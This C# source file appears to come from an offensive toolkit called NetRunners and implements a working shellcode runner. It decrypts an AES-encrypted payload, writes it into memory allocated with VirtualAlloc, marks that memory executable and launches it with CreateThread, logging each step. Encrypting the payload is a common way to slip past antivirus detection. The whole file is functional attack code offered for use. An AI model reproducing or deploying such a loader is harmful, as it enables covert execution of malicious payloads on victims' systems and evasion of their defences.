using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;

using NetRunners.Interfaces;
using static NetRunners.Decryptors.AesDecryptor;
using static NetRunners.Data.WinConstants;
using static NetRunners.Delegates.Delegate;
using static NetRunners.Data.EncryptedData;
using static NetRunners.Helpers.Helper;

namespace NetRunners.Runners
{
    /// <summary>
    /// This class contains the Basic Shellcode Runner.
    /// Retrieves encrypted payload from Shellcode class.
    /// Retrieves win32 apis from Win32APIs class, retrieves needed structures from Structures class.
    /// </summary>
    public class DefaultRunner : IRunner
    {
        public void Run(string[] args = null)
        {
            try
            {
                // print technique name and target process (if applicable)
                string techniqueName = "Default Runner";
                PrintTechniqueInfo(techniqueName);

                // get process handle, determine process architecture
                IntPtr hProcess = GetCurrentProcess();
                if (hProcess == (IntPtr.Zero))
                    throw new InvalidOperationException($"[-] GetCurrentProcess failed with error code: {Marshal.GetLastWin32Error()}");

                bool IsRemote32BitProcess;
                IsWow64Process(hProcess, out IsRemote32BitProcess);

                // retrieve unencrypted payload size
                int sBuf = SelectPayloadSize(IsRemote32BitProcess);

                // perform memory allocation, print pid + allocated address info
                IntPtr pMemory = VirtualAlloc(IntPtr.Zero, (uint)sBuf, MEM_COMMIT_RESERVE, PAGE_READWRITE);
                if (pMemory == IntPtr.Zero)
                    throw new InvalidOperationException($"VirtualAlloc failed with error code: {Marshal.GetLastWin32Error()} ");

                int processID = System.Diagnostics.Process.GetCurrentProcess().Id;
                var allocAddress = string.Format("{0:X}", pMemory);                 // Pointer -> String
                UInt64 number = UInt64.Parse(allocAddress);                         // String -> Int
                string allocAddressHex = number.ToString("x");                      // Int -> Hex
                Console.WriteLine($"[+] RW Memory Address (VirtualAlloc) to processID-> {processID} on Mem.Address -> 0x{allocAddressHex}");

                // select decrypt payload
                byte[] buf = SelectPayloadArchitecture(IsRemote32BitProcess);
                buf = DecryptBytesToBytesAes(buf, AesKey);

                // copy payload to allocated memory
                Marshal.Copy(buf, 0, pMemory, sBuf);
                Console.WriteLine("[+] Payload has been written to the buffer!");

                // change memory protection to exec read
                uint oldProtect;
                int bVP = VirtualProtect(pMemory, (UIntPtr)sBuf, PAGE_EXECUTE_READ, out oldProtect);
                if (bVP != 1) // not true
                    throw new InvalidOperationException($"VirtualProtect failed with error code: {Marshal.GetLastWin32Error()}");
                Console.WriteLine("[+] Memory Address protections changed to EXECUTE_READ");

                //Enumerate the threads of the process before creating a new one.
                List<int> threadList = new List<int>();
                ProcessThreadCollection threadsBefore = Process.GetProcessById(processID).Threads;
                foreach (ProcessThread thread in threadsBefore)
                {
                    threadList.Add(thread.Id);
                }

                // execute shellcode
                IntPtr hThread = CreateThread(IntPtr.Zero, 0, pMemory, IntPtr.Zero, 0, IntPtr.Zero);
                if (hThread == IntPtr.Zero)
                    throw new InvalidOperationException($"CreateThread failed with error code: {Marshal.GetLastWin32Error()} ");

                Console.WriteLine("[+] Shellcode Executed!");

                // call wait function
                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
            catch (Exception e)
            {
                // handle error
                Console.WriteLine($"An error occurred: {e.Message}");
                throw;
            }
        }
    }
}
